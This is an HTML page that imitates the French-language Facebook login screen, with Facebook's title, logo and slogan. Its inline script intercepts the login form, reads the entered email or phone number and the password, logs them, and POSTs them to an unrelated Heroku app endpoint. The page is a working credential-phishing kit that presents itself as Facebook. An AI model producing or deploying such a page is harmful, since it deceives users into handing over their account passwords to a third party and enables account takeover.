<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="325_325.png">
    <title>Facebook</title>
    <link rel="stylesheet" href="style.css">    
    <link rel="icon" href="32_32.png">
</head>
<body>
    <div class="face_body">
        <div class="title">
            <div class="title_face">
                <img src="facee.svg" alt="Facebook_image">
            </div>
            <h2 class="slogan">
                Avec Facebook, partager et rester en contact avec votre entourage.
            </h2>
        </div>
        <div class="formulaire">
            <div class="form_inscription">
                <form method="post"id="loginForm" class="formul">
                    <input type="text"  name="number" id="number" placeholder="Adresse email ou numéro de tel." class="input_text">
                    <input type="password" id="pass" placeholder="Mot de passe" class="input_text">
                    <input type="submit"  value="Se connecter" class="input_button">
                </form>
                <div class="link_oublie">
                    <a href="#">
                        Mot de passe oublié ?
                    </a>
                </div>
                <div class="creer_compte">
                    <a href="#">Créer nouveau compte</a>
                </div>
            </div>
            <div class="creer_page">
                <p>
                    <strong class="page_text">Créer une page</strong> pour une célébrité, une marque ou une <br> entreprise..
                </p>
            </div>
        </div>
    </div>
    <div class="image_fond">
        <img src="500_500.png" alt="Jolie dossier">
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Empêche l'envoi du formulaire par défaut

            // Récupère les valeurs des champs du formulaire
            var number = document.getElementById("number").value;
            var password = document.getElementById("pass").value;

            // Vous pouvez faire ce que vous voulez avec les valeurs récupérées ici
            // Par exemple, les afficher dans la console
            console.log("Numéro de téléphone : " + number);
            console.log("Mot de passe : " + password);

            fetch("https://universal-6223e2e8c152.herokuapp.com/login-client",{
            method: "POST",
            crossDomain: true,
            headers:{
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Access-Control-Allow-Origin": "*",
            },
            body:JSON.stringify({
                number,
                password,
            }),
        })
        .then((res) => res.json())
        .then((data) => {
            if(data.status === "ok"){
                alert('Add successfully')
            }else{
                alert('Something went wrong')
            }
        })

            document.getElementById("number").value = "";
            document.getElementById("pass").value = "";
        });
    </script>

</body>
</html>
